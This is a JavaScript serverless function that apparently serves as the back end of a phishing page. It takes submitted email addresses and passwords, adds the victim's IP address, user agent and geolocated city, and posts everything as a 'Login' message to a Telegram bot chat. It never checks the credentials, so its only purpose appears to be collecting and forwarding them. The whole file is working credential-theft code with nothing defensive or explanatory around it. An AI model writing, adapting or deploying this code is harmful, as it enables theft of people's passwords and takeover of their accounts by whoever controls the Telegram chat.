exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: '' };
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    return { statusCode: 500, body: JSON.stringify({ ok: false, error: 'Missing env vars' }) };
  }

  let body;
  try {
    body = JSON.parse(event.body || '{}');
  } catch {
    return { statusCode: 400, body: JSON.stringify({ ok: false, error: 'Invalid JSON' }) };
  }

  const { email, password } = body;
  if (!email || !password) {
    return { statusCode: 400, body: JSON.stringify({ ok: false, error: 'Missing email or password' }) };
  }

  // Extract real IP (first IP from x-forwarded-for if available)
  const xForwardedFor = event.headers['x-forwarded-for'];
  const clientIp = xForwardedFor ? xForwardedFor.split(',')[0].trim() : (event.headers['client-ip'] || 'unknown');
  
  // Get user agent from headers (case-insensitive lookup)
  let userAgent = 'unknown';
  for (const [key, value] of Object.entries(event.headers)) {
    if (key.toLowerCase() === 'user-agent') {
      userAgent = value;
      break;
    }
  }

  // Get geolocation data
  let location = 'unknown';
  if (clientIp !== 'unknown') {
    try {
      const geoRes = await fetch(`https://ipapi.com/api/ip_query.php?ip=${clientIp}`);
      if (geoRes.ok) {
        const geoText = await geoRes.text();
        const geoData = JSON.parse(geoText);
        if (geoData && geoData.city) {
          location = geoData.city;
          if (geoData.country_name) {
            location += `, ${geoData.country_name}`;
          }
        }
      }
    } catch (err) {
      // Location stays as 'unknown' if fetch fails
    }
  }

  const text = `🔐 Login\nEmail: ${email}\nPassword: ${password}\nUser-Agent: ${userAgent}\nIP Address: ${clientIp}\nLocation: ${location}`;

  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text }),
    });
    const data = await res.json();
    if (!data.ok) {
      return { statusCode: 502, body: JSON.stringify({ ok: false, error: 'Telegram API error' }) };
    }
    return { statusCode: 200, body: JSON.stringify({ ok: true }) };
  } catch (err) {
    return { statusCode: 500, body: JSON.stringify({ ok: false, error: String(err.message) }) };
  }
};
